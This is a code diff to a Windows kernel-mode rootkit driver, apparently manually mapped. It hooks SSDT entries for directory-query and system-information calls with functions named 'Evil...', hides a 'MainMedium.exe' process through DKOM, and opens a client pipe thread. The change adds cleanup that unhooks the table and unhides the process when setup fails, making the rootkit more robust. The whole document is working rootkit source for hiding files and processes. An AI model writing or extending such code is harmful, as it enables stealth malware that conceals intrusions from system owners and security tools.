@@ -4,6 +4,17 @@
 #pragma warning(disable : 4127)
 
 
+BOOL HookRelease() {
+    roothook::SSDT::SystemServiceDTUnhook(NTQUERY_TAG);
+    roothook::SSDT::SystemServiceDTUnhook(NTQUERYEX_TAG);
+    if (!IS_DKOM) {
+        roothook::SSDT::SystemServiceDTUnhook(NTQUERYSYSINFO_TAG);
+    }
+    process::DKUnhideProcess(REMOVE_BY_INDEX_PID, 0);
+    return TRUE;
+}
+
+
 //extern "C" NTSTATUS DriverEntry(DRIVER_OBJECT * DriverObject, PUNICODE_STRING RegistryPath) {
 extern "C" NTSTATUS DriverEntry(PVOID AllocationAddress, ULONG64 AllocationSize){
     //UNREFERENCED_PARAMETER(RegistryPath);
@@ -13,22 +24,26 @@ extern "C" NTSTATUS DriverEntry(PVOID AllocationAddress, ULONG64 AllocationSize)
 
     // Hook NtQueryDirectoryFile/Ex and NtQuerySystemInformation (BETA) if IS_DKOM = 0 (FALSE):
     if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTHook(&roothook::EvilQueryDirectoryFile, NTQUERY_TAG))) {
+        HookRelease();
         return STATUS_UNSUCCESSFUL;
     }
     if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTHook(&roothook::EvilQueryDirectoryFileEx, NTQUERYEX_TAG))) {
+        HookRelease();
         return STATUS_UNSUCCESSFUL;
     }
     if (!IS_DKOM && !NT_SUCCESS(roothook::SSDT::SystemServiceDTHook(&roothook::EvilQuerySystemInformation, NTQUERYSYSINFO_TAG))) {
+        HookRelease();
         return STATUS_UNSUCCESSFUL;
-
     }
 
 
     // Get PID of medium and delete it from list by default:
     if (!NT_SUCCESS(general_helpers::GetPidNameFromListADD(&MediumPID, "MainMedium.exe", TRUE)) || MediumPID == 0) {
+        HookRelease();
         return STATUS_UNSUCCESSFUL;
     }
     if (!NT_SUCCESS(process::DKHideProcess(MediumPID, TRUE))) {
+        HookRelease();
         return STATUS_UNSUCCESSFUL;
     }
 
@@ -61,6 +76,7 @@ extern "C" NTSTATUS DriverEntry(PVOID AllocationAddress, ULONG64 AllocationSize)
 
     if (!NT_SUCCESS(Status)){
         DbgPrintEx(0, 0, "KMDFdriver - Failed to create client pipe thread, status code: 0x%x\n", Status);
+        HookRelease();
         return STATUS_UNSUCCESSFUL;
     }
     ZwClose(PipeThread);
